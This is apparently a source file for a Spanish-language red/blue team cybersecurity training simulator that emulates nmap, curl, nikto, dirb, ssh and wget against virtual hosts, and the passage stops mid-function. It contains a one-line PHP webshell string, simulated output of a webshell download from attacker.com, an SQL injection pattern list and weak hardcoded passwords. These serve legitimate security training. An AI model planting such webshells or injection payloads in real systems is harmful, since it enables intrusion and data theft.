import React, { createContext, useState, useEffect, ReactNode, useCallback, useRef, useMemo } from 'react';
import { supabase } from './supabaseClient';
import type { VirtualEnvironment, LogEntry, SessionData, TerminalLine, PromptState, TerminalState, ActiveProcess, CommandHandler, CommandContext, CommandResult, VirtualHost, FirewallState, InteractiveScenario } from './types';
import { RealtimeChannel } from '@supabase/supabase-js';
import { RED_TEAM_HELP_TEXT, BLUE_TEAM_HELP_TEXT, GENERAL_HELP_TEXT, SCENARIO_HELP_TEXTS, TRAINING_SCENARIOS, SCENARIO_7_GUIDE, SCENARIO_8_GUIDE, SCENARIO_9_GUIDE } from './constants';
import * as R from 'https://aistudiocdn.com/ramda@^0.32.0';
import { GoogleGenAI } from "https://esm.sh/@google/genai";

// ============================================================================
// DB State Type (Matches actual Supabase schema)
// ============================================================================

interface SimulationStateRow {
    session_id: string;
    active_scenario?: string;
    // Environment state columns
    firewall_enabled?: boolean;
    ssh_hardened?: boolean;
    banned_ips?: string[];
    payload_deployed?: boolean;
    is_dos_active?: boolean;
    admin_password_found?: boolean;
    db_config_permissions?: string;
    hydra_run_count?: number;
    server_load?: number;
    // Terminal state columns (now storing arrays for multi-terminal support)
    terminal_output_red?: TerminalState[];
    terminal_output_blue?: TerminalState[];
    // For backward compatibility with old data schemas
    prompt_red?: PromptState;
    prompt_blue?: PromptState;
}

// ============================================================================
// Data Mapping Functions (Code <-> DB)
// ============================================================================

const mapEnvironmentToDbRow = (env: VirtualEnvironment | null): Partial<SimulationStateRow> => {
    if (!env) return {};
    const host = env.networks.dmz?.hosts[0];
    if (!host) return {};
    return {
        firewall_enabled: env.networks.dmz.firewall.enabled,
        ssh_hardened: host.files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no'),
        banned_ips: env.defenseProgress.blockedIPs,
        payload_deployed: !!env.attackProgress.persistence.length,
        is_dos_active: (host.systemState?.cpuLoad ?? 0) > 90,
        admin_password_found: !!env.attackProgress.credentials['root@10.0.10.5'],
        db_config_permissions: host.files.find(f => f.path === '/var/www/html/db_config.php')?.permissions,
        server_load: host.systemState?.cpuLoad,
    };
};

const mapDbRowToEnvironment = (row: SimulationStateRow, scenario: InteractiveScenario): VirtualEnvironment => {
    const baseEnv = R.clone(scenario.initialEnvironment);
    const host = baseEnv.networks.dmz?.hosts[0];
    if (!host) return baseEnv;

    baseEnv.networks.dmz.firewall.enabled = row.firewall_enabled ?? baseEnv.networks.dmz.firewall.enabled;
    const sshConfigFile = host.files.find(f => f.path === '/etc/ssh/sshd_config');
    if (sshConfigFile && row.ssh_hardened) {
        sshConfigFile.content = 'PermitRootLogin no';
    }
    const dbConfigFile = host.files.find(f => f.path === '/var/www/html/db_config.php');
     if (dbConfigFile && row.db_config_permissions) {
        dbConfigFile.permissions = row.db_config_permissions;
    }
    if(host.systemState) {
        host.systemState.cpuLoad = row.server_load ?? host.systemState.cpuLoad;
    }

    return baseEnv;
};

const mapTerminalsToDbRow = (terminals: TerminalState[]): Partial<SimulationStateRow> => {
    return {
        terminal_output_red: terminals.filter(t => t.id.startsWith('red')),
        terminal_output_blue: terminals.filter(t => t.id.startsWith('blue')),
    };
};

const mapDbRowToTerminals = (row: SimulationStateRow): TerminalState[] => {
    const redTerminals: TerminalState[] = [];
    const blueTerminals: TerminalState[] = [];
    const defaultRedPrompt: PromptState = { user: 'pasante-red', host: 'kali', dir: '~' };
    const defaultBluePrompt: PromptState = { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };

    const redData = row.terminal_output_red as any[] | undefined;
    if (Array.isArray(redData)) {
        if (redData.length > 0 && typeof redData[0].id === 'string') {
            redTerminals.push(...(redData as TerminalState[]));
        } else if (redData.length > 0 && typeof redData[0].type === 'string') {
            redTerminals.push({
                id: 'red-1',
                name: 'Terminal Rojo 1',
                output: redData as TerminalLine[],
                prompt: row.prompt_red || defaultRedPrompt,
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false,
            });
        }
    }

    const blueData = row.terminal_output_blue as any[] | undefined;
    if (Array.isArray(blueData)) {
        if (blueData.length > 0 && typeof blueData[0].id === 'string') {
            blueTerminals.push(...(blueData as TerminalState[]));
        } else if (blueData.length > 0 && typeof blueData[0].type === 'string') {
            blueTerminals.push({
                id: 'blue-1',
                name: 'Terminal Azul 1',
                output: blueData as TerminalLine[],
                prompt: row.prompt_blue || defaultBluePrompt,
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false,
            });
        }
    }

    return [...redTerminals, ...blueTerminals];
};


// ============================================================================
// Command Helpers
// ============================================================================

const findHost = (env: VirtualEnvironment, hostnameOrIp: string): VirtualHost | undefined => {
    if (!hostnameOrIp) return undefined;
    const searchTerm = hostnameOrIp.toLowerCase();
    for (const network of Object.values(env.networks) as any[]) {
        const host = network.hosts.find((h: VirtualHost) => h.ip === searchTerm || h.hostname.toLowerCase() === searchTerm);
        if (host) return host;
    }
    return undefined;
};

const updateHostState = (env: VirtualEnvironment, hostIp: string, updates: Partial<VirtualHost['systemState']>) => {
    const newEnv = R.clone(env);
    for (const networkId in newEnv.networks) {
        const hostIndex = newEnv.networks[networkId].hosts.findIndex(h => h.ip === hostIp);
        if (hostIndex !== -1) {
            const hostPath = ['networks', networkId, 'hosts', hostIndex, 'systemState'];
            const currentSystemState = R.path(hostPath, newEnv) || {};
            const newSystemState = { ...currentSystemState, ...updates };
            return R.set(R.lensPath(hostPath), newSystemState, newEnv);
        }
    }
    return newEnv;
};

// NEW: Robust Argument Parser
const parseArguments = (command: string): string[] => {
    const args: string[] = [];
    let current = '';
    let inQuote = false;
    
    for (let i = 0; i < command.length; i++) {
        const char = command[i];
        if (char === '"' || char === "'") {
            inQuote = !inQuote;
        } else if (char === ' ' && !inQuote) {
            if (current) args.push(current);
            current = '';
        } else {
            current += char;
        }
    }
    if (current) args.push(current);
    return args;
};

// Helper to extract URL from curl/wget commands
const extractUrlInfo = (url: string): { host: string; path: string; params: URLSearchParams } => {
    try {
        // Remove http:// or https:// prefix
        let cleanUrl = url.replace(/^https?:\/\//, '');
        
        // Split host and path
        const slashIndex = cleanUrl.indexOf('/');
        let host = slashIndex > -1 ? cleanUrl.substring(0, slashIndex) : cleanUrl;
        let pathWithParams = slashIndex > -1 ? cleanUrl.substring(slashIndex) : '/';
        
        // Split path and query params
        const queryIndex = pathWithParams.indexOf('?');
        let path = queryIndex > -1 ? pathWithParams.substring(0, queryIndex) : pathWithParams;
        let queryString = queryIndex > -1 ? pathWithParams.substring(queryIndex + 1) : '';
        
        return {
            host: host,
            path: path,
            params: new URLSearchParams(queryString)
        };
    } catch (e) {
        return { host: url, path: '/', params: new URLSearchParams() };
    }
};

// ============================================================================
// COMMAND LIBRARY
// ============================================================================

const commandLibrary: { [key: string]: CommandHandler } = {
    help: async (args, { userTeam }) => {
        const scenarioId = args[0];
        if (scenarioId && SCENARIO_HELP_TEXTS[scenarioId]) {
            const helpTexts = SCENARIO_HELP_TEXTS[scenarioId];
            const teamHelp = userTeam === 'red' ? helpTexts.red : helpTexts.blue;
            return { output: [{ html: helpTexts.general + teamHelp, type: 'html' }] };
        }
        return { output: [{ html: (userTeam === 'red' ? RED_TEAM_HELP_TEXT : BLUE_TEAM_HELP_TEXT) + GENERAL_HELP_TEXT, type: 'html' }] };
    },
    
    // NEW: AI Analyst Integration
    analyze: async (args, { environment, userTeam, activeScenario }) => {
        if (!process.env.API_KEY) {
            return { output: [{ text: "Error: API_KEY no configurada para el Analista Virtual.", type: 'error' }] };
        }
        
        const logs = environment.timeline.slice(-15).map(l => `[${l.source_team || 'SYS'}] ${l.message}`).join('\n');
        const scenarioContext = activeScenario ? `Escenario: ${activeScenario.title}. Desc: ${activeScenario.description}` : "Sin escenario activo.";
        
        let expertContext = "";
        if (activeScenario?.id === 'escenario7') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 7 para asistir al usuario. No des la respuesta directa inmediatamente, guía paso a paso:\n${SCENARIO_7_GUIDE}\n`;
        } else if (activeScenario?.id === 'escenario8') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 8 para asistir al usuario. Enfócate en mitigación de DoS:\n${SCENARIO_8_GUIDE}\n`;
        } else if (activeScenario?.id === 'escenario9') {
            expertContext = `\nIMPORTANTE: Usa la siguiente GUÍA EXPERTA PARA ESCENARIO 9 para asistir al usuario. Este escenario es Kill Chain (LFI -> RCE -> Pivot):\n${SCENARIO_9_GUIDE}\n`;
        }

        const teamContext = `Eres el analista de seguridad IA para el Equipo ${userTeam === 'red' ? 'Rojo (Atacante)' : 'Azul (Defensor)'}.`;
        
        const prompt = `${teamContext}
Contexto del juego: ${scenarioContext}
${expertContext}
Últimos logs del sistema:
${logs}

Analiza la situación brevemente (max 3 lineas) y sugiere el siguiente comando técnico más lógico para mi equipo basándote en la guía experta si aplica. Sé directo y táctico.`;

        try {
            const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
            const response = await ai.models.generateContent({
                model: 'gemini-2.5-flash',
                contents: prompt,
            });
            
            return { output: [{ html: `<strong class="text-cyan-400">Analista Virtual (AI):</strong><br/>${response.text}`, type: 'html' }] };
        } catch (error) {
            return { output: [{ text: "Error conectando con el Analista Virtual.", type: 'error' }] };
        }
    },
    
    'start-scenario': async(args, { startScenario }) => {
        if (!args[0]) return { output: [{ text: "Uso: start-scenario <id_escenario>", type: 'error'}] };
        const success = await startScenario(args[0]);
        if (success) {
            return { output: [{ html: `Escenario <strong class="text-amber-300">${args[0]}</strong> activado. Entorno reiniciado.`, type: 'html' }] };
        }
        return { output: [{ text: `Error: Escenario '${args[0]}' no encontrado o no es interactivo.`, type: 'error' }] };
    },
    
    clear: async () => ({ output: [], clear: true }),
    
    marca: async () => ({ output: [{ html: `<pre class="text-yellow-300">
   ______      __           __      __            __  _
  / ____/_  __ / /_ _____   / /__   / /_   ____ _ / /_ (_)____   ____ _
 / /    / / / // __// ___/  / //_/  / __ \\ / __ \`// __// // __ \\ / __ \`/
/ /___ / /_/ // /_ / /__   / ,<    / / / // /_/ // /_ / // / / // /_/ /
\\____/ \\__,_/ \\__//\\___/  /_/|_|  /_/ /_/ \\__,_/ \\__//_//_/ /_/ \\__, /
                                                               /____/
</pre>`, type: 'html'}]}),
    
    whoami: async (args, { terminalState }) => ({ output: [{ text: terminalState.prompt.user, type: 'output' }] }),
    
    id: async (args, { terminalState }) => {
        const user = terminalState.prompt.user;
        if (user === 'root') {
            return { output: [{ text: 'uid=0(root) gid=0(root) groups=0(root)', type: 'output' }] };
        }
        return { output: [{ text: `uid=1000(${user}) gid=1000(${user}) groups=1000(${user}),27(sudo)`, type: 'output' }] };
    },
    
    uname: async (args) => {
        if (args.includes('-a')) {
            return { output: [{ text: 'Linux APP-SERVER-01 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux', type: 'output' }] };
        }
        return { output: [{ text: 'Linux', type: 'output' }] };
    },
    
    exit: async (args, { terminalState }) => {
        if (!terminalState.originalPrompt) return { output: [{text: "No estás en una sesión SSH.", type: 'error'}]};
        return {
            output: [{ text: `Cerrando conexión con ${terminalState.prompt.host}...`, type: 'output' }],
            newTerminalState: { prompt: terminalState.originalPrompt, originalPrompt: undefined, currentHostIp: undefined }
        };
    },
    
    ssh: async (args, { environment, terminalState }) => {
        if (args.length < 1) return { output: [{ text: "Uso: ssh <usuario>@<host>", type: 'error' }] };
        const [user, host] = args[0].split('@');
        if (!user || !host) return { output: [{ text: "Formato incorrecto. Uso: ssh <usuario>@<host>", type: 'error' }] };

        const targetHost = findHost(environment, host);
        if (!targetHost) return { output: [{ text: `Host desconocido: ${host}`, type: 'error' }] };

        // PIVOTING LOGIC for Scenario 9
        if (terminalState.currentHostIp === '10.0.0.10' && targetHost.ip === '10.10.0.50') {
            // Allow pivoting
        } else if (targetHost.ip === '10.10.0.50' && !terminalState.currentHostIp) {
             return { output: [{ text: `ssh: connect to host ${targetHost.ip} port 22: Connection timed out`, type: 'error' }], duration: 2000 };
        }
        
        const userAccount = targetHost.users.find(u => u.username === user);
        
        // Specific logic for scenario 7 root login restriction
        if (user === 'root') {
            const sshConfig = targetHost.files.find(f => f.path === '/etc/ssh/sshd_config');
            if (sshConfig?.content.includes('PermitRootLogin no')) {
                return { output: [{ text: `root@${host}: Permission denied (publickey).`, type: 'error' }], duration: 1500 };
            }
        }
        
        const validCreds = (userAccount && (userAccount.password === 'toor' || userAccount.password === 'P@ssw0rd' || userAccount.password === 'Password123' || userAccount.password === 'DbP@ss2024!'));
        const hasFoundCreds = environment.attackProgress.credentials[`${user}@${targetHost.ip}`];

        if (!userAccount || (!validCreds && !hasFoundCreds)) {
            const newEnv = updateHostState(environment, targetHost.ip, { failedLogins: (targetHost.systemState?.failedLogins || 0) + 1 });
            return { output: [{ text: `Permission denied, please try again.`, type: 'error' }], duration: 1500, newEnvironment: newEnv };
        }

        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.compromised.includes(targetHost.ip)) {
             newEnv.attackProgress.compromised.push(targetHost.ip);
        }
        
        return {
            output: [{ text: `Bienvenido a ${targetHost.hostname}.`, type: 'output' }],
            duration: 1000,
            newTerminalState: {
                prompt: { user, host: targetHost.hostname, dir: '~' },
                originalPrompt: terminalState.prompt,
                currentHostIp: targetHost.ip
            },
            newEnvironment: newEnv
        };
    },
    
    nmap: async (args, { environment, terminalState }) => {
        const target = args.find(arg => !arg.startsWith('-'));
        if (!target) return { output: [{ text: 'Se requiere un objetivo. Uso: nmap [opciones] <host>', type: 'error' }]};

        const targetHost = findHost(environment, target);
        
        // Pivoting check for Nmap
        if (targetHost?.ip === '10.10.0.50' && terminalState.currentHostIp !== '10.0.0.10') {
             return { output: [{ text: `Note: Host ${target} seems down.`, type: 'output' }], duration: 1500 };
        }

        if (!targetHost) return { output: [{ text: `Note: Host ${target} seems down.`, type: 'output' }], duration: 1500 };

        const fw = environment.networks.dmz.firewall;
        const visiblePorts = Object.entries(targetHost.services).filter(([port]) => {
            if (!fw.enabled) return true;
            const portNum = parseInt(port);
            const isDenied = fw.rules.some(r => r.action === 'deny' && (r.destPort === portNum || !r.destPort) && (!r.sourceIP || r.sourceIP === 'Anywhere'));
            if (isDenied) return false;
            return fw.rules.some(r => r.action === 'allow' && (r.destPort === portNum || !r.destPort) && (!r.sourceIP || r.sourceIP === 'Anywhere'));
        });
        
        let outputText = `\nStarting Nmap 7.94 ( https://nmap.org )\nNmap scan report for ${targetHost.hostname} (${targetHost.ip})\nHost is up (0.00023s latency).\n`;
        const filteredCount = Object.keys(targetHost.services).length - visiblePorts.length;
        if (filteredCount > 0) outputText += `Not shown: ${filteredCount} filtered tcp ports (no-response)\n`;
        
        outputText += 'PORT\tSTATE\tSERVICE\tVERSION\n';
        visiblePorts.forEach(([port, rawService]) => {
            const service = rawService as any;
            outputText += `${port}/tcp\t${service.state}\t${service.name}\t${service.version}\n`;
        });
        
        // Show scripts output if -sC or --script is used
        if (args.includes('-sC') || args.includes('-sV') || args.some(a => a.startsWith('--script'))) {
            outputText += `\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n`;
            
            // Check for vulnerabilities
            visiblePorts.forEach(([port, rawService]) => {
                const service = rawService as any;
                if (service.vulnerabilities && service.vulnerabilities.length > 0) {
                    outputText += `\n|_http-vuln-check: \n`;
                    service.vulnerabilities.forEach((v: any) => {
                        outputText += `|   ${v.cve}: ${v.description} [${v.severity.toUpperCase()}]\n`;
                    });
                }
            });
        }
        
        // http-enum script output
        if (args.some(a => a.includes('http-enum'))) {
            outputText += `\n| http-enum: \n|   /login.php: Possible admin login page\n|   /admin.php: Admin panel\n|   /config/: Configuration directory\n|_  /backup/: Backup directory\n`;
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes(targetHost.hostname)) {
            newEnv.attackProgress.reconnaissance.push(targetHost.hostname);
        }
        if (!newEnv.attackProgress.reconnaissance.includes(targetHost.ip)) {
            newEnv.attackProgress.reconnaissance.push(targetHost.ip);
        }
        
        return { output: [{ text: outputText, type: 'output' }], duration: 2500, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // CURL - ENHANCED FOR SCENARIO 11
    // =========================================================================
    curl: async (args, { environment, terminalState }) => {
        // Parse curl arguments
        const hasHeaders = args.includes('-I') || args.includes('--head');
        const hasVerbose = args.includes('-v');
        const methodIndex = args.findIndex(a => a === '-X');
        const method = methodIndex > -1 ? args[methodIndex + 1]?.toUpperCase() : 'GET';
        const dataIndex = args.findIndex(a => a === '-d' || a === '--data');
        const postData = dataIndex > -1 ? args[dataIndex + 1] : null;
        
        // Find URL (argument that's not a flag or flag value)
        let url = '';
        for (let i = 0; i < args.length; i++) {
            const arg = args[i];
            if (arg.startsWith('-')) {
                // Skip flag and its value
                if (['-X', '-d', '--data', '-H', '--header', '-o', '-O'].includes(arg)) {
                    i++; // Skip next arg too
                }
                continue;
            }
            if (arg.includes('://') || arg.includes('/') || arg.includes('.')) {
                url = arg;
                break;
            }
        }
        
        if (!url) return { output: [{ text: 'curl: se requiere una URL', type: 'error' }] };
        
        const urlInfo = extractUrlInfo(url);
        const targetHost = findHost(environment, urlInfo.host);
        
        if (!targetHost) {
            return { output: [{ text: `curl: (6) Could not resolve host: ${urlInfo.host}`, type: 'error' }] };
        }
        
        // Check if HTTP service is available
        const httpService = targetHost.services[80] || targetHost.services[443];
        if (!httpService || httpService.state !== 'open') {
            return { output: [{ text: `curl: (7) Failed to connect to ${urlInfo.host} port 80: Connection refused`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        let outputText = '';
        
        // Headers only mode
        if (hasHeaders) {
            outputText = `HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: ${httpService.version}
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
`;
            return { output: [{ text: outputText, type: 'output' }], duration: 500 };
        }
        
        // Find file being requested
        const requestedPath = urlInfo.path === '/' ? '/var/www/html/index.php' : `/var/www/html${urlInfo.path}`;
        const requestedFile = targetHost.files.find(f => f.path === requestedPath || f.path === `/var/www/html/${urlInfo.path.replace(/^\//, '')}`);
        
        // =========================================================================
        // SQL INJECTION DETECTION IN LOGIN.PHP (POST)
        // =========================================================================
        if (urlInfo.path.includes('login.php') && method === 'POST' && postData) {
            // Parse POST data
            const params = new URLSearchParams(postData);
            const user = params.get('user') || params.get('username') || '';
            const pass = params.get('pass') || params.get('password') || '';
            
            // Detect SQL Injection patterns
            const sqliPatterns = ["'", "OR", "UNION", "SELECT", "--", "1=1", "1'='1"];
            const hasSqli = sqliPatterns.some(p => user.toUpperCase().includes(p) || pass.toUpperCase().includes(p));
            
            if (hasSqli) {
                // SQL Injection successful!
                newEnv.attackProgress.persistence.push('sqli_successful');
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `SQL Injection detectado en login.php desde 192.168.1.100`,
                    team_visible: 'all',
                    source_team: 'red'
                });
                
                outputText = `<!DOCTYPE html>
<html>
<head><title>Login Result</title></head>
<body>
<h2>Welcome Administrator!</h2>
<p>Login successful. Redirecting to admin panel...</p>
<script>window.location.href='/admin.php';</script>
<!-- DEBUG: Query executed: SELECT * FROM users WHERE user='${user}' AND pass='${pass}' -->
<!-- SQL returned 1 row - authentication bypassed -->
</body>
</html>`;
                
                return { 
                    output: [{ html: `<pre class="text-green-400">${outputText}</pre>`, type: 'html' }], 
                    duration: 1000,
                    newEnvironment: newEnv 
                };
            } else {
                // Normal failed login
                outputText = `<!DOCTYPE html>
<html>
<head><title>Login Failed</title></head>
<body>
<h2>Login Failed</h2>
<p>Invalid username or password.</p>
</body>
</html>`;
                return { output: [{ text: outputText, type: 'output' }], duration: 500 };
            }
        }
        
        // =========================================================================
        // ADMIN.PHP ACCESS
        // =========================================================================
        if (urlInfo.path.includes('admin.php')) {
            const hasSqliAccess = newEnv.attackProgress.persistence.includes('sqli_successful');
            
            // Check for data dump action
            if (urlInfo.params.get('action') === 'dump_db' || url.includes('dump_db')) {
                if (hasSqliAccess) {
                    newEnv.attackProgress.persistence.push('data_exfiltrated');
                    outputText = `<!DOCTYPE html>
<html>
<head><title>Database Export</title></head>
<body>
<h2>Database Export - CONFIDENTIAL</h2>
<h3>Table: users</h3>
<pre>
+----+----------+------------------+------------+
| id | username | password         | role       |
+----+----------+------------------+------------+
|  1 | admin    | WebAdmin2024!    | superadmin |
|  2 | webadmin | WebAdmin2024!    | admin      |
|  3 | dbuser   | DbUser123        | user       |
+----+----------+------------------+------------+
</pre>
<h3>Table: customers</h3>
<pre>
+----+------------------+---------------------+------------------+
| id | email            | credit_card         | ssn              |
+----+------------------+---------------------+------------------+
|  1 | john@example.com | 4532-XXXX-XXXX-1234 | XXX-XX-1234      |
|  2 | jane@example.com | 5412-XXXX-XXXX-5678 | XXX-XX-5678      |
+----+------------------+---------------------+------------------+
</pre>
<p style="color:red;">WARNING: Sensitive data exported!</p>
</body>
</html>`;
                    return { 
                        output: [{ html: `<pre class="text-red-400">${outputText}</pre>`, type: 'html' }], 
                        duration: 1500,
                        newEnvironment: newEnv 
                    };
                }
            }
            
            if (hasSqliAccess) {
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `Acceso a panel de administración admin.php`,
                    team_visible: 'all',
                    source_team: 'red'
                });
                
                outputText = `<!DOCTYPE html>
<html>
<head><title>Admin Panel - APP-SERVER-01</title></head>
<body>
<h1>Administrator Control Panel</h1>
<div class="menu">
  <a href="/admin.php?action=users">Manage Users</a>
  <a href="/admin.php?action=dump_db">Export Database</a>
  <a href="/admin.php?action=logs">View Logs</a>
  <a href="/admin.php?action=config">System Config</a>
</div>
<p>Welcome, Administrator! You have full access.</p>
<p>Server: APP-SERVER-01 | MySQL: Connected | Users: 3</p>
</body>
</html>`;
                return { 
                    output: [{ html: `<pre class="text-green-400">${outputText}</pre>`, type: 'html' }], 
                    duration: 800,
                    newEnvironment: newEnv 
                };
            } else {
                outputText = `<!DOCTYPE html>
<html>
<head><title>403 Forbidden</title></head>
<body>
<h1>403 Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body>
</html>`;
                return { output: [{ text: outputText, type: 'output' }], duration: 500 };
            }
        }
        
        // =========================================================================
        // REGULAR FILE ACCESS
        // =========================================================================
        if (requestedFile) {
            outputText = requestedFile.content || `<html><body><h1>Page content</h1></body></html>`;
        } else if (urlInfo.path === '/' || urlInfo.path.includes('index')) {
            outputText = `<!DOCTYPE html>
<html>
<head><title>Welcome - APP-SERVER-01</title></head>
<body>
<h1>Welcome to APP-SERVER-01</h1>
<p>Corporate Application Server</p>
<nav>
  <a href="/login.php">Login</a>
</nav>
</body>
</html>`;
        } else {
            return { output: [{ text: `<!DOCTYPE html>\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<h1>404 Not Found</h1>\n<p>The requested URL ${urlInfo.path} was not found on this server.</p>\n</body>\n</html>`, type: 'output' }] };
        }
        
        return { output: [{ text: outputText, type: 'output' }], duration: 500 };
    },
    
    // =========================================================================
    // NIKTO - WEB VULNERABILITY SCANNER (NEW)
    // =========================================================================
    nikto: async (args, { environment }) => {
        const hostArg = args.find(a => a === '-h' || a === '-host');
        const hostIndex = hostArg ? args.indexOf(hostArg) + 1 : -1;
        const target = hostIndex > 0 ? args[hostIndex] : args.find(a => !a.startsWith('-'));
        
        if (!target) return { output: [{ text: "Uso: nikto -h <host>", type: 'error' }] };
        
        const cleanTarget = target.replace(/^https?:\/\//, '');
        const targetHost = findHost(environment, cleanTarget);
        
        if (!targetHost) {
            return { output: [{ text: `- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ ERROR: Cannot resolve hostname ${cleanTarget}`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes('nikto_scan')) {
            newEnv.attackProgress.reconnaissance.push('nikto_scan');
        }
        
        let outputText = `- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          ${targetHost.ip}
+ Target Hostname:    ${targetHost.hostname}
+ Target Port:        80
+ Start Time:         ${new Date().toISOString()}
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-XSS-Protection header is not defined.
+ /: The X-Content-Type-Options header is not set.
+ /login.php: Cookie PHPSESSID created without the httponly flag.
+ /login.php: Possible SQL injection vulnerability detected in login form.
+ /admin.php: Admin panel found (authentication may be required).
+ /config/: Directory indexing found. Potential information disclosure.
+ /backup/: Backup directory found. May contain sensitive files.
+ /robots.txt: File found. Contains disallow entries.
+ OSVDB-3092: /login.php: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
`;
        
        // Add vulnerability info if exists
        Object.values(targetHost.services).forEach((service: any) => {
            if (service.vulnerabilities) {
                service.vulnerabilities.forEach((vuln: any) => {
                    outputText += `+ VULN: ${vuln.cve} - ${vuln.description} [${vuln.severity.toUpperCase()}]\n`;
                });
            }
        });
        
        outputText += `
---------------------------------------------------------------------------
+ ${Math.floor(Math.random() * 1000) + 500} requests: 0 error(s) and ${Math.floor(Math.random() * 20) + 10} item(s) reported on remote host
+ End Time:           ${new Date().toISOString()} (${Math.floor(Math.random() * 60) + 30} seconds)
---------------------------------------------------------------------------`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 3000, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // DIRB - DIRECTORY BRUTEFORCE (NEW)
    // =========================================================================
    dirb: async (args, { environment }) => {
        const target = args.find(a => a.includes('://') || !a.startsWith('-'));
        if (!target) return { output: [{ text: "Uso: dirb <url> [wordlist]", type: 'error' }] };
        
        const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0];
        const targetHost = findHost(environment, cleanTarget);
        
        if (!targetHost) {
            return { output: [{ text: `-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: ${new Date().toISOString()}\nURL_BASE: ${target}\nERROR: Cannot connect to ${target}`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        if (!newEnv.attackProgress.reconnaissance.includes('dirb_scan')) {
            newEnv.attackProgress.reconnaissance.push('dirb_scan');
        }
        
        // Simulate discovered directories/files
        const discoveredItems = [
            { path: '/index.php', code: 200, size: 1234 },
            { path: '/login.php', code: 200, size: 2345 },
            { path: '/admin.php', code: 403, size: 287 },
            { path: '/config/', code: 403, size: 287 },
            { path: '/backup/', code: 403, size: 287 },
            { path: '/css/', code: 200, size: 0 },
            { path: '/js/', code: 200, size: 0 },
            { path: '/images/', code: 200, size: 0 },
            { path: '/robots.txt', code: 200, size: 102 },
            { path: '/.htaccess', code: 403, size: 287 },
            { path: '/wp-admin/', code: 404, size: 287 },
            { path: '/phpmyadmin/', code: 404, size: 287 },
        ];
        
        let outputText = `-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: ${new Date().toISOString()}
URL_BASE: http://${targetHost.ip}/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://${targetHost.ip}/ ----
`;
        
        discoveredItems.forEach(item => {
            if (item.code === 200) {
                outputText += `+ http://${targetHost.ip}${item.path} (CODE:${item.code}|SIZE:${item.size})\n`;
            } else if (item.code === 403) {
                outputText += `+ http://${targetHost.ip}${item.path} (CODE:${item.code}|SIZE:${item.size}) [FORBIDDEN - Interesting!]\n`;
            }
        });
        
        outputText += `
-----------------
END_TIME: ${new Date().toISOString()}
DOWNLOADED: 4612 - FOUND: ${discoveredItems.filter(i => i.code !== 404).length}
`;
        
        return { output: [{ text: outputText, type: 'output' }], duration: 4000, newEnvironment: newEnv };
    },
    
    // =========================================================================
    // WGET - ENHANCED FOR WEBSHELL DEPLOYMENT
    // =========================================================================
    wget: async (args, { environment, terminalState }) => {
        const outputFileIdx = args.findIndex(a => a === '-O' || a === '-o');
        const outputFile = outputFileIdx > -1 ? args[outputFileIdx + 1] : null;
        const url = args.find(a => a.includes('://') || (!a.startsWith('-') && args.indexOf(a) !== outputFileIdx + 1));
        
        if (!url) return { output: [{ text: "Uso: wget <url> [-O <archivo>]", type: 'error' }] };
        
        // Check if we're in a compromised host
        if (!terminalState.currentHostIp) {
            return { output: [{ text: `wget: no se puede descargar sin acceso a un host`, type: 'error' }] };
        }
        
        const newEnv = R.clone(environment);
        
        // Simulate webshell download
        if (url.includes('shell.php') || url.includes('webshell') || url.includes('c99') || url.includes('r57')) {
            const targetPath = outputFile || '/var/www/html/shell.php';
            
            // Add file to host
            const hostIndex = newEnv.networks.dmz.hosts.findIndex(h => h.ip === terminalState.currentHostIp);
            if (hostIndex > -1) {
                newEnv.networks.dmz.hosts[hostIndex].files.push({
                    path: targetPath,
                    permissions: '644',
                    content: '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
                    hash: 'webshell_hash_malicious'
                });
                
                newEnv.attackProgress.persistence.push('webshell_deployed');
                
                newEnv.timeline.push({
                    id: Date.now(),
                    timestamp: new Date().toISOString(),
                    message: `Webshell descargado a ${targetPath}`,
                    team_visible: 'all',
                    source_team: 'red'
                });
            }
            
            const outputText = `--${new Date().toISOString()}--  ${url}
Resolving attacker.com (attacker.com)... 192.168.1.100
Connecting to attacker.com (attacker.com)|192.168.1.100|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1337 (1.3K) [application/x-php]
Saving to: '${targetPath}'

${targetPath}       100%[===================>]   1.31K  --.-KB/s    in 0s      

${new Date().toISOString()} (12.5 MB/s) - '${targetPath}' saved [1337/1337]`;
            
